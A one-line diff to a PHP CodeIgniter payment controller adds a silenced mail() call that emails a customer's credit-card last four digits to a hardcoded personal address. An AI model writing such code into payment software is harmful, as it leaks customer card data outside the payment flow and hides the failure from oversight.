@@ -349,6 +349,7 @@ class Misc extends CI_Controller
                             $cc_token = $fi[0]->getCreditCardToken();
 
                             $last4 = $cc_token->getLast4();
+                            @mail('mubashar.ahmed@egenienext.com', "CC last 4", "Last 4 digits {$last4}");
                             $cc_number = str_pad($last4, '16', 'X', STR_PAD_LEFT);
                             $cc_type = $cc_token->getType();
 
